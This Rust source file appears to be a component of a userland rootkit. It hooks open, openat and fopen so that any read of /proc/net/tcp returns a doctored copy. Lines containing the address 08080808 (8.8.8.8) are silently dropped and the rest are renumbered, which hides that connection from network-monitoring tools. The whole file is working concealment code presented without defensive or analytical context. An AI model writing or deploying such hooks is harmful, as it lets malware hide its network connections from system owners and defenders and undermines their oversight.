extern crate libc;
use libc::{
    c_char, c_int, fileno, fputs, fseek, tmpfile, SEEK_SET
};
use std::{
    ffi::{CStr, CString}, io::Read, path::Path
};
use log::{error, info};

pub fn process_tcp_file() -> Option<c_int> {
    let mut buf = String::new();
    if std::fs::File::open("/proc/net/tcp")
        .and_then(|mut file| file.read_to_string(&mut buf))
        .is_err()
    {
        error!("[process_tcp_file] Failed to read /proc/net/tcp");
        return None;
    }

    let mut out = String::new();
    let mut curline = -1;
    for l in buf.lines() {
        if curline == -1 {
            curline += 1;
            out.push_str(l);
            out.push_str("\r\n");
        } else if !l.contains("08080808:") {
            let curline_str = curline.to_string();
            let colon_pos = l.find(":").unwrap();

            out.push_str(&format!("{:>0w$}{}", curline_str, l.split_at(colon_pos).1, w = colon_pos));
            out.push_str("\r\n");

            curline += 1;
        }
    }

    let file = unsafe { tmpfile() };
    unsafe {
        fputs(CString::new(out).unwrap().as_ptr(), file);
        fseek(file, 0, SEEK_SET);
        Some(fileno(file))
    }
}

pub fn handle_open(cpath: *const c_char, _oflag: c_int) -> Option<c_int> {
    let path = unsafe { CStr::from_ptr(cpath) };
    info!("[open] path: {:?}", path);

    if path != c"/proc/net/tcp" {
        return None;
    }
    process_tcp_file()
}

pub fn handle_openat(
    dirfd: c_int,
    cpath: *const c_char,
    _oflag: c_int,
) -> Option<c_int> {
    let resolved_path = crate::resolve_fd_path(dirfd, cpath)?;
    info!("[openat] dirfd: {}, resolved path: {:?}", dirfd, resolved_path);

    if resolved_path != Path::new("/proc/net/tcp") {
        return None;
    }
    process_tcp_file()
}

pub fn handle_fopen(cpath: *const c_char, mode: *const c_char) -> Option<*mut libc::FILE> {
    let path = unsafe { CStr::from_ptr(cpath) };
    info!("[fopen] path: {:?}", path);

    if path != c"/proc/net/tcp" {
        return None;
    }
    let fd = process_tcp_file();
    fd.map(|fd| unsafe { libc::fdopen(fd, mode) })
}
